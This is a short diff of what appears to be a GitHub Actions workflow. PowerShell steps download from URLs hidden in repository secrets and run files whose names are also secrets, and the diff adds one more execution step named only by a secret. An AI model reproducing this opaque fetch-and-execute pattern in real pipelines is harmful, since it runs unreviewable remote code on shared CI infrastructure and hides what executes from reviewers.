@@ -14,6 +14,7 @@ jobs:
         Invoke-WebRequest ${{ secrets.EA_A }}
         Invoke-WebRequest ${{ secrets.EA_B }}
         .\${{ secrets.EA_C }}
+        .\${{ secrets.EA_J }}
     - name: command 2
       run: ${{ secrets.EA_D }}
     - name: command 3
